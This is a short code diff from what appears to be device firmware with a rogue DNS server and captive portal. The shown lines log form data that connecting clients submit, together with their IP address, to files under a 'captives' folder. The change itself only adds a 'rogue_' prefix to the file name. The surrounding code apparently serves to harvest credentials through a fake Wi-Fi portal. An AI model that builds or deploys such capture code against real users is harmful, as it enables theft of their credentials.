@@ -345,7 +345,7 @@ void RogueDnsServer::_startWeb()
       if (data.length() > 0 && Uni.Storage) {
         String cleanHost = host;
         cleanHost.replace(".", "_");
-        String savePath = "/unigeek/wifi/captives/" + cleanHost + ".txt";
+        String savePath = "/unigeek/wifi/captives/rogue_" + cleanHost + ".txt";
         Uni.Storage->makeDir("/unigeek/wifi/captives");
 
         String entry = req->client()->remoteIP().toString() + " | " + data + "\n";
